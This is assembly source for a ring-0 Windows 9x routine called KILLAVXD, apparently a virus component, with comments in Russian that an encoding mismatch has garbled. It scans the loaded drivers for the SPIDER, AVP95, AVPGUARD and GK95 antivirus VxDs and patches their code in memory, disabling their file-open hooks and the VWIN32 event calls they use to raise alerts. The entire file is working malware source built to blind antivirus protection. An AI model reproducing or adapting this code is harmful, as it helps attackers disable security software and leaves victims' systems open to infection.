   ; [ring-0]

   ; KILLAVXD -- special release 1.50

   ; spider.vxd & avp95.vxd
   ; disable R0_OPENCREATFILE[_IN_CONTEXT]

   ; avpg.vxd
   ; â® ¦¥ çâ® ¨ ¤«ï ¯¥à¢ëå ¤¢ãå, ¯«îá ª íâ®¬ã:
   ; ¬¥ï¥¬ ¢ë§®¢ë ä-æ¨© VWIN32_SysErrorBox & ..._SetWin32Event   'mov eax,1'

   ; íä¥ªâ: ¢á¥ § âëª îâáï, avpguard  ç¨ ¥¬ ¥áª®«ìª® â®à¬®§¨âì á¨áâ¥¬ã.
   ; ¤ ¡ë ã¡à âì  ®ïé¨© ¤¥«í©,  ¤® ( ¢¥à®¥) â ª¨¬ ¦¥ ®¡à §®¬ ¯à®¯ âç¨âì
   ; ç¥-¨âì â¨¯  VxDcall xxx_xxxTimeOut, å®âï ¬¥   íâ®  áà âì.

   killavxd:               pusha

                           VxDcall VXDLDR, GetDeviceList

   __kavxd_scanvxd:        mov     ebx, [eax+5]

                           cmp     ebx, 0C0000000h
                           jb      __kavxd_continue

                           lea     ecx, [ebx+0Ch]  ; Name_0

                           mov     edx, [ecx]
                           neg     edx

                           mov     cl, 1
                           cmp     edx, -'DIPS'   ; SPIDER
                           je      __kavxd_patch
                           mov     cl, 2
                           cmp     edx, -'9PVA'   ; AVP95
                           je      __kavxd_patch
                           mov     cl, 4
                           cmp     edx, -'GPVA'   ; AVPGUARD
                           je      __kavxd_patch
                           mov     cl, 8
                           cmp     edx, -'59KG'   ; GK95
                           je      __kavxd_patch

   __kavxd_continue:       mov     eax, [eax]
                           or      eax, eax
                           jnz     __kavxd_scanvxd

                           popa
                           ret

   __kavxd_patch:          pusha

                           pusho   kavxd_kill_moveax
                           pop     ebp

                           mov     esi, 0000D500h     ; R0_OPENCREATFILE
                           call    __kavxd_fuck
                           mov     esi, 0000D501h     ; R0_OPENCREAT_IN_CONTEXT
                           call    __kavxd_fuck

   ;  © ¤  ª á¯¥àáª¨©,  © ¤  fucking shit!
                           cmp     cl, 4   ;  avpguard
                           jne     __skip1

   ;                       mov     eax, 1+1Bh          ; unload vxd
   ;                       call    dword ptr [ebx+18h] ; control_proc_0

                           pusho   kavxd_kill_cd20
                           pop     ebp

                           mov     esi, 002A001Ah     ; VWIN32_SysErrorBox
                           call    __kavxd_fuck
                           mov     esi, 002A000Eh     ; VWIN32_SetWin32Event
                           call    __kavxd_fuck

                           pusho   kavxd_kill_badcall
                           pop     ebp

                           mov     eax, 002Ah ; VMM
                           xor     edi, edi
                           VMMcall Get_DDB
                           mov     edx, [ecx+30h]  ; DDB_Service_Table_Ptr

                           ; LEA, but not MOV !
                           lea     esi, [edx+4*001Ah] ; VWIN32_SysErrorBox
                           call    __kavxd_fuck
                           lea     esi, [edx+4*000Eh] ; VWIN32_SetWin32Event
                           call    __kavxd_fuck

   __skip1:                popa
                           jmp     __kavxd_continue

   __kavxd_fuck:           pusha

                           mov     edi, [ebx+18h]  ; Control_Proc_0

   __kavxd_1:              lea     ecx, [edi+4]    ; check presence for
                           test    ecx, 00000FFFh  ; each new page encountered
                           jnz     __kavxd_2

                           pusha

                           sub     esp, 28
                           mov     esi, esp

                           push    28
                           push    esi             ; esi = MEMORY_BASIC_INFO
                           push    ecx
                           VxDcall VMM, PageQuery

                           test    dword ptr [esi+10h], 1000h ; mbi_state & MEM_COMMIT

                           lea     esp, [esp + 4*3 + 28]

                           popa
                           jnz     __kavxd_2

                           popa
                           ret

   __kavxd_2:              inc     edi

                           cmp     [edi], esi           ; <esi>
                           jne     __kavxd_1

                           call    ebp

                           jmp     __kavxd_1

   kavxd_kill_moveax:      cmp     byte ptr [edi-1], 0B8h
                           jne     rt
                           mov     dword ptr [edi], -1  ; R0_xxx <-- 0xFFFFFFFF
                           ret

   kavxd_kill_cd20:        cmp     word ptr [edi-2], 20CDh
                           jne     rt
   kavxd_kill_both:        mov     word ptr [edi-2], 0B890h  ; nop/mov eax, 1
                           mov     dword ptr [edi], 1
                           ret

   kavxd_kill_badcall:     cmp     word ptr [edi-2], 15FFh
                           je      kavxd_kill_both
   rt:                     ret
